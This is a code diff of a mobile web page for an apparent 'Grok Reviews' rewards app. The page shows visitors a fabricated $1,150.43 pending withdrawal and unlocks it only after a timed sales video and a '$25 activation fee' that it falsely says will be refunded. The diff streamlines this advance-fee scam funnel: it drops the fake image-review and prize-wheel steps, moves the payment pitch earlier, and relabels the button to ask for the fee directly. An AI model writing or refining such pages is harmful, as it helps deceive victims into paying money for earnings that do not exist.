@@ -50,10 +50,9 @@ body{font-family:system-ui,-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sa
 <div id="welcome-modal" class="fixed inset-0 z-[70] flex items-center justify-center bg-black/70 px-4 backdrop-blur-sm">
   <div class="w-full max-w-sm rounded-3xl border border-emerald-400/50 bg-white p-6 text-center shadow-2xl">
     <h2 class="text-2xl font-black leading-tight text-[#0f172a]">Welcome to the Official Grok Reviews App</h2>
-    <p class="mt-4 text-sm font-semibold leading-relaxed text-[#64748b]">To activate the app and complete your withdrawal, complete the tasks:</p>
+    <p class="mt-4 text-sm font-semibold leading-relaxed text-[#64748b]">To activate the app and complete your withdrawal, watch the video below:</p>
     <ul class="mt-4 space-y-3 text-left text-sm font-medium leading-relaxed text-[#0f172a]">
-      <li class="flex gap-3"><span class="font-black text-emerald-500">•</span><span>Watch the 4-minute video until the end</span></li>
-      <li class="flex gap-3"><span class="font-black text-emerald-500">•</span><span>Complete 15 more reviews</span></li>
+      <li class="flex gap-3"><span class="font-black text-emerald-500">•</span><span>Watch the video until the end</span></li>
     </ul>
     <button id="btn-close-welcome" type="button" data-funnel-step="yes_i_do1" class="mt-6 w-full rounded-xl bg-emerald-500 px-4 py-3 text-sm font-black uppercase tracking-wide text-emerald-950 shadow-lg shadow-emerald-500/20 transition hover:bg-emerald-400 active:scale-[0.98]">Watch Video</button>
   </div>
@@ -97,157 +96,11 @@ body{font-family:system-ui,-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sa
         </div>
       </div>
       <div class="mt-3 rounded-xl bg-red-50 border border-red-200 p-3 text-center">
-        <p class="text-xs font-semibold text-red-500">Complete the tasks to have the withdrawal approved.</p>
+        <p class="text-xs font-semibold text-red-500">Watch the video to have the withdrawal approved.</p>
       </div>
     </div>
     <button class="mt-4 w-full rounded-xl bg-gray-200 py-3 text-sm font-black uppercase tracking-wide text-gray-400 cursor-not-allowed" disabled>Withdraw</button>
-    <p class="mt-2 text-center text-xs font-semibold text-red-500">Incomplete mandatory tasks.</p>
-  </div>
-</div>
-
-<!-- REVIEWS MODAL -->
-<!-- REVIEWS MULTI-STEP MODAL -->
-<div id="reviews-modal" class="fixed inset-0 z-[80] flex items-end justify-center bg-black/50 backdrop-blur-sm hidden" onclick="if(event.target===this)closeReviews()">
-  <div class="w-full max-w-md rounded-t-3xl bg-white shadow-2xl modal-slide max-h-[90vh] overflow-y-auto">
-
-    <!-- STEP 0: Main reviews menu -->
-    <div id="rv-step0" class="p-5">
-      <div class="flex items-center justify-between mb-5">
-        <div class="flex items-center gap-2"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="18" height="18" x="3" y="3" rx="2" ry="2"/><circle cx="9" cy="9" r="2"/><path d="m21 15-3.086-3.086a2 2 0 0 0-2.828 0L6 21"/></svg><h3 class="text-lg font-black">Reviews</h3></div>
-        <button onclick="closeReviews()" class="rounded-full p-1 hover:bg-gray-100"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 6 6 18"/><path d="m6 6 12 12"/></svg></button>
-      </div>
-      <button class="flex w-full items-center justify-between rounded-2xl border border-[#e2e8f0] bg-white p-4 text-left transition active:scale-[.99]">
-        <span><span class="block font-bold">Review history</span><span id="rv-history-count" class="text-xs text-[#64748b]">View your 4 completed reviews</span></span>
-        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="m9 12 2 2 4-4"/></svg>
-      </button>
-      <div id="rv-cooldown-wrap" class="hidden mt-3 rounded-2xl border border-red-200 bg-red-50 px-4 py-3 text-center">
-        <p class="text-sm font-semibold text-red-500">The next image will be available in <span id="rv-cooldown-timer" class="font-black">0:45</span>.</p>
-      </div>
-      <button id="rv-generate-btn" onclick="startGenerate()" class="mt-3 w-full rounded-2xl bg-emerald-500 px-4 py-4 text-base font-extrabold text-white transition active:scale-[.99]">Generate image to review</button>
-      <p class="pt-2 text-center text-xs text-[#64748b]">Create a new image and share your opinion.</p>
-      <p class="pt-2 text-center text-xs text-[#64748b] flex items-center justify-center gap-1"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg> Reviews are saved to your account</p>
-    </div>
-
-    <!-- STEP 1: Generating image -->
-    <div id="rv-step1" class="p-5 hidden">
-      <div class="flex items-center justify-between mb-3">
-        <div class="flex items-center gap-2"><button onclick="rvGoStep(0)" class="text-emerald-500 font-bold text-sm flex items-center gap-1"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m15 18-6-6 6-6"/></svg> Reviews</button></div>
-        <button onclick="closeReviews()" class="rounded-full p-1 hover:bg-gray-100"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 6 6 18"/><path d="m6 6 12 12"/></svg></button>
-      </div>
-      <div class="rounded-2xl border border-[#e2e8f0] p-8 text-center my-4">
-        <div class="mx-auto mb-4 flex size-24 items-center justify-center">
-          <svg id="rv-gen-spinner" viewBox="0 0 100 100" class="size-24"><circle cx="50" cy="50" r="42" fill="none" stroke="#e2e8f0" stroke-width="6"/><circle cx="50" cy="50" r="42" fill="none" stroke="#10b981" stroke-width="6" stroke-linecap="round" stroke-dasharray="264" stroke-dashoffset="264" style="transition:stroke-dashoffset .3s"/></svg>
-          <span id="rv-gen-time" class="absolute text-xl font-black text-emerald-500" style="font-family:monospace">3.4s</span>
-        </div>
-        <h3 class="text-lg font-black text-[#0f172a]">Generating image with AI "Qwen Image 3"</h3>
-        <p id="rv-gen-prompt" class="mt-2 text-sm italic text-[#64748b]">reflection of city lights in a rain-covered win</p>
-      </div>
-      <p class="text-center text-xs text-[#64748b] flex items-center justify-center gap-1"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg> Reviews are saved to your account</p>
-    </div>
-
-    <!-- STEP 2: Image review form -->
-    <div id="rv-step2" class="p-5 hidden">
-      <div class="flex justify-end mb-2"><button onclick="closeReviews()" class="rounded-full p-1 hover:bg-gray-100"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 6 6 18"/><path d="m6 6 12 12"/></svg></button></div>
-      <img id="rv-review-img" src="/images/12-rain-window.webp" alt="AI Generated" class="w-full rounded-xl object-cover aspect-square"/>
-      <p class="mt-3 text-center text-xs text-[#64748b] font-mono">Model: Qwen Image 3 · 1024×1024 · Generated in 3.4s</p>
-      <p id="rv-review-prompt" class="mt-1 text-center text-sm italic text-[#64748b]">Prompt: "reflection of city lights in a rain-covered window at night, out-of-focus traffic behind the glass, 1:1 square format"</p>
-      <div class="mt-4 rounded-2xl border border-[#e2e8f0] p-4">
-        <div class="flex justify-between text-[10px] uppercase tracking-wider text-[#64748b] font-bold mb-3"><span>1 — Obviously AI</span><span>5 — Indistinguishable from a photo</span></div>
-        <div id="rv-ratings" class="space-y-3">
-          <div class="flex items-center justify-between border-b border-[#e2e8f0] pb-3"><span class="font-bold text-[#0f172a]">Realism</span><div class="rv-stars flex gap-1" data-cat="realism"></div></div>
-          <div class="flex items-center justify-between border-b border-[#e2e8f0] pb-3"><span class="font-bold text-[#0f172a]">Detail & texture</span><div class="rv-stars flex gap-1" data-cat="detail"></div></div>
-          <div class="flex items-center justify-between border-b border-[#e2e8f0] pb-3"><span class="font-bold text-[#0f172a]">Lighting</span><div class="rv-stars flex gap-1" data-cat="lighting"></div></div>
-          <div class="flex items-center justify-between"><span class="font-bold text-[#0f172a]">Generation Time: 3.4s</span><div class="rv-stars flex gap-1" data-cat="gentime"></div></div>
-        </div>
-      </div>
-      <div class="mt-4 rounded-2xl border border-[#e2e8f0] p-4 text-center">
-        <h4 class="font-bold text-[#0f172a] mb-3">What did you notice?</h4>
-        <div id="rv-tags" class="flex flex-wrap justify-center gap-2">
-          <button type="button" class="rv-tag rounded-full border border-[#e2e8f0] px-3 py-1.5 text-sm text-[#64748b] transition active:scale-95">Hands</button>
-          <button type="button" class="rv-tag rounded-full border border-[#e2e8f0] px-3 py-1.5 text-sm text-[#64748b] transition active:scale-95">Text / letters</button>
-          <button type="button" class="rv-tag rounded-full border border-[#e2e8f0] px-3 py-1.5 text-sm text-[#64748b] transition active:scale-95">Lighting</button>
-          <button type="button" class="rv-tag rounded-full border border-[#e2e8f0] px-3 py-1.5 text-sm text-[#64748b] transition active:scale-95">Reflections</button>
-          <button type="button" class="rv-tag rounded-full border border-[#e2e8f0] px-3 py-1.5 text-sm text-[#64748b] transition active:scale-95">Skin texture</button>
-          <button type="button" class="rv-tag rounded-full border border-[#e2e8f0] px-3 py-1.5 text-sm text-[#64748b] transition active:scale-95">Proportions</button>
-          <button type="button" class="rv-tag rounded-full border border-[#e2e8f0] px-3 py-1.5 text-sm text-[#64748b] transition active:scale-95">Nothing off</button>
-        </div>
-      </div>
-      <button onclick="submitReview()" class="mt-4 w-full rounded-2xl bg-[#e2e8f0] px-4 py-4 text-base font-extrabold text-[#64748b] transition active:scale-[.99]" id="rv-submit-btn">Submit review</button>
-      <p class="pt-2 text-center text-xs text-[#64748b] flex items-center justify-center gap-1"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg> Reviews are saved to your account</p>
-    </div>
-
-    <!-- STEP 3: Sending review -->
-    <div id="rv-step3" class="p-5 hidden">
-      <div class="rounded-2xl border border-[#e2e8f0] p-8 text-center my-8">
-        <div class="mx-auto mb-4 flex size-20 items-center justify-center">
-          <svg viewBox="0 0 100 100" class="size-20"><circle cx="50" cy="50" r="42" fill="none" stroke="#e2e8f0" stroke-width="6"/><circle cx="50" cy="50" r="42" fill="none" stroke="#10b981" stroke-width="6" stroke-linecap="round" stroke-dasharray="264" stroke-dashoffset="34"/></svg>
-          <span class="absolute text-lg font-black text-emerald-500">87%</span>
-        </div>
-        <h3 class="text-lg font-black text-[#0f172a]">Sending review</h3>
-        <p class="mt-2 text-sm text-[#64748b]">Sending the evaluation to the Qwen Image 3 model's database.</p>
-      </div>
-    </div>
-
-    <!-- STEP 4: Review completed -->
-    <div id="rv-step4" class="p-5 hidden">
-      <div class="rounded-2xl border border-[#e2e8f0] p-8 text-center my-4">
-        <div class="mx-auto mb-4 flex size-16 items-center justify-center rounded-full bg-emerald-100"><svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="2"><circle cx="12" cy="12" r="10"/><text x="12" y="17" text-anchor="middle" font-size="14" fill="#10b981" stroke="none" font-weight="bold">$</text></svg></div>
-        <h3 class="text-2xl font-black text-[#0f172a]">Review completed</h3>
-        <p class="mt-2 text-base text-[#0f172a]">You unlocked <span class="font-black text-emerald-500" id="rv-reward-amt">+$30.62</span></p>
-        <p class="text-sm text-[#64748b]">in reward credits.</p>
-        <div class="mt-4 space-y-2 text-left">
-          <div class="flex justify-between text-sm"><span class="uppercase tracking-wider text-[#64748b] font-bold">Platform commission</span><span class="font-bold text-[#0f172a]">$2.99</span></div>
-          <div class="flex justify-between text-sm"><span class="uppercase tracking-wider text-[#64748b] font-bold">Evaluator commission</span><span class="font-bold text-[#0f172a]" id="rv-evaluator-amt">$27.63</span></div>
-        </div>
-        <div class="mt-4 inline-block rounded-full bg-emerald-50 px-4 py-2"><span class="text-sm font-bold text-emerald-600" id="rv-new-balance">New balance: $1175.43</span></div>
-      </div>
-    </div>
-
-    <!-- STEP 5: Prize wheel -->
-    <div id="rv-step5" class="p-5 hidden">
-      <div class="flex items-center justify-between mb-2">
-        <div class="flex items-center gap-3"><div class="flex size-10 items-center justify-center rounded-xl bg-emerald-100 text-emerald-600"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 7v14"/><path d="M20 11v8a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2v-8"/><path d="M7.5 7a1 1 0 0 1 0-5A4.8 8 0 0 1 12 7a4.8 8 0 0 1 4.5-5 1 1 0 0 1 0 5"/><rect x="3" y="7" width="18" height="4" rx="1"/></svg></div><div><h3 class="text-lg font-black text-[#0f172a]">Prize wheel</h3><p class="text-sm text-[#64748b]" id="rv-wheel-attempt">Attempt 5 of 7</p></div></div>
-        <button onclick="closeReviews()" class="rounded-full p-1 hover:bg-gray-100"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 6 6 18"/><path d="m6 6 12 12"/></svg></button>
-      </div>
-      <div class="flex gap-1 mb-4" id="rv-wheel-progress"></div>
-      <div class="relative mx-auto" style="width:280px;height:280px">
-        <div class="absolute left-1/2 -top-2 -translate-x-1/2 z-10 text-emerald-500" style="filter:drop-shadow(0 2px 4px rgba(0,0,0,.2))"><svg width="24" height="20" viewBox="0 0 24 20"><path d="M12 20L0 0h24z" fill="currentColor"/></svg></div>
-        <canvas id="rv-wheel-canvas" width="280" height="280" class="w-full"></canvas>
-      </div>
-      <button onclick="spinWheel()" id="rv-spin-btn" class="mt-4 w-full rounded-2xl bg-emerald-500 px-4 py-4 text-base font-extrabold text-white transition active:scale-[.99]">Spin the wheel</button>
-      <p class="pt-2 text-center text-sm text-[#64748b]">Your chance is available. Spin the wheel to continue.</p>
-    </div>
-
-  </div>
-</div>
-
-<!-- BONUS MODAL -->
-<div id="bonus-modal" class="fixed inset-0 z-[80] flex items-end justify-center bg-black/50 backdrop-blur-sm hidden" onclick="if(event.target===this)this.classList.add('hidden')">
-  <div class="w-full max-w-md rounded-t-3xl bg-white p-5 shadow-2xl modal-slide max-h-[85vh] overflow-y-auto">
-    <div class="flex items-center justify-between mb-1">
-      <div><div class="flex items-center gap-2"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 7v14"/><path d="M20 11v8a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2v-8"/><path d="M7.5 7a1 1 0 0 1 0-5A4.8 8 0 0 1 12 7a4.8 8 0 0 1 4.5-5 1 1 0 0 1 0 5"/><rect x="3" y="7" width="18" height="4" rx="1"/></svg><h3 class="text-lg font-black">A.I Rewards bonuses</h3></div><p class="text-xs text-[#64748b] mt-0.5">Extra rewards available for selected users</p></div>
-      <button onclick="document.getElementById('bonus-modal').classList.add('hidden')" class="rounded-full p-1 hover:bg-gray-100"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 6 6 18"/><path d="m6 6 12 12"/></svg></button>
-    </div>
-    <div class="mt-4 space-y-4">
-      <div class="rounded-2xl border border-[#e2e8f0] p-4 text-center">
-        <div class="flex items-center justify-between mb-2"><div class="flex items-center gap-2"><span class="flex size-8 items-center justify-center rounded-lg bg-emerald-100 text-emerald-600"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M13 2 3 14h9l-1 8 10-12h-9l1-8z"/></svg></span><span class="font-bold text-[#0f172a]">A.I Review Boost</span></div><span class="rounded-full bg-emerald-100 px-2 py-0.5 text-[10px] font-bold text-emerald-700 uppercase">Free</span></div>
-        <p class="font-bold text-[#0f172a]">10X Review Access</p>
-        <p class="text-xs text-[#64748b] mt-1">Unlock faster access to simple A.I answer checks and extra reward credits.</p>
-        <button class="mt-3 w-full rounded-xl bg-emerald-500 py-3 text-sm font-black uppercase tracking-wide text-white">Redeem Bonus</button>
-      </div>
-      <div class="rounded-2xl border border-[#e2e8f0] p-4 text-center">
-        <div class="flex items-center justify-between mb-2"><div class="flex items-center gap-2"><span class="flex size-8 items-center justify-center rounded-lg bg-pink-100 text-pink-600">🎉</span><span class="font-bold text-[#0f172a]">Smart Answer Pack</span></div><span class="rounded-full bg-emerald-100 px-2 py-0.5 text-[10px] font-bold text-emerald-700 uppercase">Free</span></div>
-        <p class="font-bold text-[#0f172a]">Extra A.I answer checks</p>
-        <p class="text-xs text-[#64748b] mt-1">Access a special list of A.I answers to review inside the system.</p>
-        <button class="mt-3 w-full rounded-xl bg-emerald-500 py-3 text-sm font-black uppercase tracking-wide text-white border-2 border-emerald-600">Redeem Bonus</button>
-      </div>
-      <div class="rounded-2xl border border-[#e2e8f0] p-4 text-center">
-        <div class="flex items-center justify-between mb-2"><div class="flex items-center gap-2"><span class="flex size-8 items-center justify-center rounded-lg bg-blue-100 text-blue-600"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect width="18" height="18" x="3" y="3" rx="2" ry="2"/><circle cx="9" cy="9" r="2"/><path d="m21 15-3.086-3.086a2 2 0 0 0-2.828 0L6 21"/></svg></span><span class="font-bold text-[#0f172a]">Image Review Bonus</span></div><span class="rounded-full bg-emerald-100 px-2 py-0.5 text-[10px] font-bold text-emerald-700 uppercase">Free</span></div>
-        <p class="font-bold text-[#0f172a]">$12 wallet credit</p>
-        <p class="text-xs text-[#64748b] mt-1">Promotional credits added to your wallet, released at the end of the video.</p>
-        <button class="mt-3 w-full rounded-xl bg-emerald-500 py-3 text-sm font-black uppercase tracking-wide text-white border-2 border-emerald-600">Redeem Bonus</button>
-      </div>
-    </div>
+    <p class="mt-2 text-center text-xs font-semibold text-red-500">Watch the video to unlock.</p>
   </div>
 </div>
 
@@ -259,7 +112,7 @@ body{font-family:system-ui,-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sa
       <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4"/><path d="M12 8h.01"/></svg>
     </div>
     <h3 class="text-xl font-black text-[#0f172a]">Activate your app</h3>
-    <p class="mt-2 text-sm text-[#64748b]">Use the activation button below to activate your app for free and unlock your withdrawal.</p>
+    <p class="mt-2 text-sm text-[#64748b]">Use the activation button below to activate your app and unlock your withdrawal.</p>
     <div class="mt-4 h-2 w-full overflow-hidden rounded-full bg-gray-200">
       <div class="h-full rounded-full bg-emerald-500" style="width:33%;animation:none"></div>
     </div>
@@ -314,7 +167,7 @@ body{font-family:system-ui,-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sa
 
   <!-- VIDEO TITLE -->
   <section class="mx-4 mt-3 rounded-2xl border border-emerald-500/50 bg-white px-4 py-4 text-center shadow-[0_0_18px_rgba(16,185,129,0.16)]">
-    <h1 class="text-base font-black leading-tight text-[#0f172a] sm:text-lg">Watch the 3-minute video to ACTIVATE THE APP AND COMPLETE YOUR $1,150.43 TRANSACTION.</h1>
+    <h1 class="text-base font-black leading-tight text-[#0f172a] sm:text-lg">Watch the video to ACTIVATE THE APP AND COMPLETE YOUR $1,150.43 TRANSACTION.</h1>
   </section>
 
   <!-- VIDEO PLAYER (VTurb) -->
@@ -333,21 +186,21 @@ body{font-family:system-ui,-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sa
     <script type="text/javascript">var s=document.createElement("script");s.src="https://scripts.converteai.net/2223d7db-1826-46ab-bf08-708ee5b93e74/players/6aee3760ef834710073f15d9/v4/player.js",s.async=!0,document.head.appendChild(s);</script>
   </div>
 
-  <!-- ACTIVATION SECTION (appears after video progress) -->
+  <!-- ACTIVATION SECTION (appears after video reaches 17:00) -->
   <section id="activation-section" class="mx-4 mt-3 rounded-2xl border border-emerald-500/50 bg-emerald-500 px-4 py-5 text-center shadow-[0_0_18px_rgba(16,185,129,0.16)] hidden">
     <p class="text-sm font-bold uppercase text-white leading-snug">TO UNLOCK UNLIMITED WITHDRAWALS AND REVIEWS, AND TO COMPLETE YOUR PENDING WITHDRAWAL, ACTIVATE THE APP USING THE BUTTON BELOW.</p>
-    <button id="btn-activate" type="button" data-funnel-step="vsl_checkout1" class="mt-4 w-full rounded-xl bg-emerald-600 py-4 text-sm font-black uppercase tracking-wide text-white shadow-lg transition hover:bg-emerald-700 active:scale-[0.98]">Activate App and Verify Account</button>
+    <button id="btn-activate" type="button" data-funnel-step="vsl_checkout1" class="mt-4 w-full rounded-xl bg-emerald-600 py-4 text-sm font-black uppercase tracking-wide text-white shadow-lg transition hover:bg-emerald-700 active:scale-[0.98]">Pay $25 Activation Fee</button>
     <p class="mt-3 text-xs text-white/80">This small fee of US$ 25 is for account verification and will be fully refunded within one business day.</p>
   </section>
 
   <!-- MANDATORY TASKS COMPLETED BANNER -->
   <section id="mandatory-banner" class="mx-4 mt-3 rounded-2xl border border-emerald-400/50 bg-emerald-50 px-4 py-4 text-center hidden">
-    <p class="text-sm font-bold uppercase text-emerald-800 leading-snug italic">MANDATORY TASKS COMPLETED, ACTIVATE THE APP AND VERIFY YOUR ACCOUNT USING THE BUTTON ABOVE TO RECEIVE YOUR WITHDRAWAL AND UNLOCK ALL APP FEATURES.</p>
+    <p class="text-sm font-bold uppercase text-emerald-800 leading-snug italic">VIDEO COMPLETED. ACTIVATE THE APP AND VERIFY YOUR ACCOUNT USING THE BUTTON ABOVE TO RECEIVE YOUR WITHDRAWAL AND UNLOCK ALL APP FEATURES.</p>
   </section>
 
-  <!-- TASKS SECTION -->
+  <!-- TASK SECTION -->
   <section class="mx-4 mt-3 rounded-2xl border px-4 py-5 shadow-[0_0_18px_rgba(16,185,129,0.16)] border-emerald-500/50 bg-white">
-    <h2 class="text-center text-lg font-black leading-tight text-[#0f172a]">Mandatory tasks to unlock unlimited withdrawals and unlimited evaluations</h2>
+    <h2 class="text-center text-lg font-black leading-tight text-[#0f172a]">Watch the video to unlock your withdrawal</h2>
     <div class="mt-5 space-y-3">
       <div class="flex items-center gap-3 rounded-xl border border-[#e2e8f0] bg-[#f8fafc] px-3 py-3">
         <div id="task1-circle" class="relative flex size-11 shrink-0 items-center justify-center rounded-full text-[10px] font-black text-red-500" style="background:conic-gradient(rgb(239 68 68) 0deg, rgb(239 68 68 / 0.2) 0deg)">
@@ -355,23 +208,10 @@ body{font-family:system-ui,-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sa
         </div>
         <div class="flex min-w-0 items-center gap-2 text-sm font-semibold text-[#0f172a]">
           <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="size-4 shrink-0 text-red-500" id="task1-icon"><path d="M5 5a2 2 0 0 1 3.008-1.728l11.997 6.998a2 2 0 0 1 .003 3.458l-12 7A2 2 0 0 1 5 19z"/></svg>
-          Watch the 3-minute video
+          Watch the video until the end
         </div>
       </div>
-      <button id="btn-reviews-task" type="button" class="flex w-full items-center gap-3 rounded-xl border px-3 py-3 text-left transition active:scale-[.99] border-red-500/40 bg-[#f8fafc]">
-        <div id="task2-circle" class="relative flex size-11 shrink-0 items-center justify-center rounded-full text-[10px] font-black text-red-500" style="background:conic-gradient(rgb(239 68 68) 0deg, rgb(239 68 68 / 0.2) 0deg)">
-          <span class="flex size-9 items-center justify-center rounded-full bg-[#f8fafc]" id="task2-pct">0%</span>
-        </div>
-        <div class="flex min-w-0 items-center gap-2 text-sm font-semibold text-[#0f172a]">
-          <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="size-4 shrink-0 text-red-500" id="task2-icon"><rect width="18" height="18" x="3" y="3" rx="2" ry="2"/><circle cx="9" cy="9" r="2"/><path d="m21 15-3.086-3.086a2 2 0 0 0-2.828 0L6 21"/></svg>
-          <span>Complete <span id="reviews-remaining">15</span> more reviews</span>
-        </div>
-      </button>
     </div>
-    <button id="btn-cta" type="button" class="mt-4 flex w-full items-center justify-center gap-2 rounded-xl px-4 py-3 text-sm font-black uppercase tracking-wide shadow-lg transition active:scale-[0.98] bg-red-500 text-white shadow-red-500/20">
-      <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="size-4"><rect width="18" height="18" x="3" y="3" rx="2" ry="2"/><circle cx="9" cy="9" r="2"/><path d="m21 15-3.086-3.086a2 2 0 0 0-2.828 0L6 21"/></svg>
-      <span id="cta-text">Complete 15 Reviews</span>
-    </button>
   </section>
 
   <!-- VIEWERS + LIVE CHAT -->
@@ -411,14 +251,6 @@ body{font-family:system-ui,-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sa
     <span class="flex size-7 items-center justify-center"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="18" height="18" x="3" y="3" rx="2"/><path d="M3 9a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2"/><path d="M3 11h3c.8 0 1.6.3 2.1.9l1.1.9c1.6 1.6 4.1 1.6 5.7 0l1.1-.9c.5-.5 1.3-.9 2.1-.9H21"/></svg></span>
     <span>Wallet</span>
   </button>
-  <button type="button" onclick="document.getElementById('reviews-modal').classList.remove('hidden')" class="flex min-w-14 flex-col items-center gap-0.5 text-[10px] font-medium text-[#64748b] transition active:scale-95">
-    <span class="flex size-7 items-center justify-center"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 7v14"/><path d="M20 11v8a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2v-8"/><path d="M7.5 7a1 1 0 0 1 0-5A4.8 8 0 0 1 12 7a4.8 8 0 0 1 4.5-5 1 1 0 0 1 0 5"/><rect x="3" y="7" width="18" height="4" rx="1"/></svg></span>
-    <span>Reviews</span>
-  </button>
-  <button type="button" onclick="document.getElementById('bonus-modal').classList.remove('hidden')" class="flex min-w-14 flex-col items-center gap-0.5 text-[10px] font-medium text-[#64748b] transition active:scale-95">
-    <span class="flex size-7 items-center justify-center"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 7v14"/><path d="M20 11v8a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2v-8"/><path d="M7.5 7a1 1 0 0 1 0-5A4.8 8 0 0 1 12 7a4.8 8 0 0 1 4.5-5 1 1 0 0 1 0 5"/><rect x="3" y="7" width="18" height="4" rx="1"/></svg></span>
-    <span>Bonus</span>
-  </button>
   <button type="button" onclick="document.getElementById('profile-modal').classList.remove('hidden')" class="flex min-w-14 flex-col items-center gap-0.5 text-[10px] font-medium text-[#64748b] transition active:scale-95">
     <span class="flex size-7 items-center justify-center"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="8" r="5"/><path d="M20 21a8 8 0 0 0-16 0"/></svg></span>
     <span>Profile</span>
@@ -435,7 +267,6 @@ var P=window.location.search;
 var params=new URLSearchParams(P);
 function go(u){window.location.href=u+P}
 
-// Fill modals with URL param data
 var fullName=(params.get('first_name')||'')+(params.get('last_name')?' '+params.get('last_name'):'');
 var firstName=params.get('first_name')||'';
 var email=params.get('email')||'';
@@ -443,25 +274,21 @@ if(fullName){document.getElementById('wallet-name').textContent=fullName;documen
 if(email){document.getElementById('wallet-email').textContent='PayPal: '+email;document.getElementById('wallet-email2').textContent='To '+email;document.getElementById('profile-email').textContent=email;document.getElementById('profile-email2').textContent=email}
 if(firstName){document.getElementById('profile-avatar').textContent=firstName.charAt(0).toUpperCase()}
 
-// Geo
 fetch('/api/geo-country').then(function(r){return r.json()}).then(function(d){if(d.countryName)document.getElementById('viewer-country').textContent=d.countryName}).catch(function(){});
 
 // Welcome modal
 document.getElementById('btn-close-welcome').addEventListener('click',function(){document.getElementById('welcome-modal').classList.add('hidden')});
 
-// CTA + reviews task → open reviews modal; activate → checkout (placeholder)
-document.getElementById('btn-cta').addEventListener('click',function(){document.getElementById('reviews-modal').classList.remove('hidden')});
-document.getElementById('btn-reviews-task').addEventListener('click',function(){document.getElementById('reviews-modal').classList.remove('hidden')});
+// Activate → checkout (locked until PITCH_TIME)
 document.getElementById('btn-activate').addEventListener('click',function(){go('/pay')});
 
-// Video progress — activation appears at 20:30 (1230s)
-var PITCH_TIME=1230;
+// Video progress — activation appears at 17:00 (1020s)
+var PITCH_TIME=1020;
 var vPct=0,videoComplete=false,pitchReached=false;
 var t1c=document.getElementById('task1-circle'),t1p=document.getElementById('task1-pct');
 var activationSection=document.getElementById('activation-section');
 var mandatoryBanner=document.getElementById('mandatory-banner');
